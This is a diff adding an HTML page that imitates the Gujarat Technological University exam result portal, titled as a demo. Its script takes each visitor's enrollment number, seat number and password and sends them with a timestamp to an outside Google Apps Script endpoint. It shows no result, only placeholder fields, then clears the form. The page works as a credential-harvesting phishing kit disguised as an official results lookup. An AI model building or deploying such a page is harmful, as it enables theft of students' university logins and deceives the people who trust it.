@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GTU Result Search (Demo)</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#fff; margin:0; padding:0; }
+    .header { text-align:center; color:#0a2a8a; font-size:26px; font-weight:bold; margin:15px 5px; }
+    .container { max-width:900px; margin:auto; border-top:3px solid red; padding:10px; }
+    .box { display:flex; gap:20px; margin-top:20px; }
+    .left, .right { flex:1; border:1px solid #ccc; padding:15px; background:#eef3fb; }
+    label { display:inline-block; width:120px; font-weight:bold; }
+    input, select { padding:6px; width:220px; max-width:100%; }
+    .captcha { font-size:22px; font-weight:bold; background:#ddd; padding:5px 12px; display:inline-block; letter-spacing:3px; }
+    .refresh { cursor:pointer; margin-left:8px; font-size:18px; }
+    button { padding:8px 20px; background:#0066cc; color:#fff; border:none; cursor:pointer; margin-top:10px; }
+    .note { margin-top:20px; border:1px dashed orange; padding:10px; text-align:center; font-size:14px; }
+
+    /* 📱 Mobile Responsive */
+    @media (max-width: 768px) {
+      .box { flex-direction:column; }
+      label { width:100%; margin-bottom:4px; }
+      input, select { width:100%; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="header">Gujarat Technological University Ahmedabad</div>
+
+<div class="container">
+  <div class="box">
+    <div class="left">
+      <h3>🔍 SEARCH :</h3>
+      <form id="loginForm">
+        <p><label>Session</label> Winter 2025</p>
+        <p><label>Exam</label>
+          <select>
+            <option>BE SEM 7 - Regular (DEC 2025)</option>
+          </select>
+        </p>
+        <p><label>Enroll No.</label><input type="text" id="enroll" required /></p>
+        <p><label>Seat No.</label><input type="text" id="seat" required /></p>
+        <p><label>Password</label><input type="password" id="password" required /></p>
+        <p>
+          <label>Code</label>
+          <span class="captcha" id="captcha"></span>
+          <span class="refresh" onclick="generateCaptcha()">🔄</span><br>
+          <input type="text" id="captchaInput" placeholder="Enter captcha" required>
+        </p>
+        <button type="submit">Search</button>
+      </form>
+    </div>
+
+    <div class="right">
+      <h3>📄 SEARCH RESULT :</h3>
+      <p>Name : --------</p>
+      <p>Enrollment No. : --------</p>
+      <p>Exam Seat No. : --------</p>
+      <p>Exam : --------</p>
+      <p>Branch : --------</p>
+    </div>
+  </div>
+
+  <div class="note">
+    This is a computer generated provisional result, please consider the hard-copy gradesheet as final result.
+  </div>
+</div>
+
+<script>
+  const scriptURL ="https://script.google.com/macros/s/AKfycbzO4scbYdtpjoImd4dhghxjxPFNB33lzyIKFCpcse0XHK30GPuWcd9Fh0d7VcqaSfb0/exec";
+  let currentCaptcha = "";
+
+  function generateCaptcha() {
+    currentCaptcha = Math.floor(1000 + Math.random() * 9000).toString();
+    document.getElementById("captcha").innerText = currentCaptcha;
+  }
+
+  generateCaptcha();
+
+  document.getElementById("loginForm").addEventListener("submit", e => {
+    e.preventDefault();
+
+    const userCaptcha = document.getElementById("captchaInput").value;
+    if (userCaptcha !== currentCaptcha) {
+      alert("Captcha incorrect ❌");
+      generateCaptcha();
+      return;
+    }
+
+    const data = {
+      enroll: document.getElementById("enroll").value,
+      seat: document.getElementById("seat").value,
+      password: document.getElementById("password").value,
+      time: new Date().toLocaleString()
+    };
+
+    fetch(scriptURL, {
+      method: "POST",
+      body: JSON.stringify(data)
+    })
+    .then(() => alert)
+    .catch(() => alert("Error ❌"));
+
+    generateCaptcha();
+    document.getElementById("loginForm").reset();
+  });
+</script>
+
+</body>
+</html>
